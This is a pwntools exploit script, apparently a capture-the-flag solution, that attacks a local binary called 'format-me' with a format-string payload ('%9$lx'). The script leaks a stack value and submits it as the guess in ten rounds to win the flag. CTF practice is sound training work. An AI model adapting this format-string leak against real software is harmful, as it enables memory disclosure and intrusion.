#!/usr/bin/env python3
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./format-me")

r = process([exe.path])
# r = gdb.debug([exe.path]) # if you need to use gdb debug, please de-comment this line, and comment last line

offset = 9

for _ in range(10):
    # Add your code Here
    r.recvuntil(b"Recipient? ")
    r.sendline(f"%{offset}$lx".encode())
    
    r.recvuntil(b"Sending to ")
    leaked_hex = int(r.recvuntil(b"...\n")[:-4].decode(), 16)

    r.recvuntil(b"Guess? ")
    r.sendline(str(leaked_hex).encode())
    r.recvuntil(b"Correct")

r.recvuntil(b"Here's your flag: ")
r.interactive()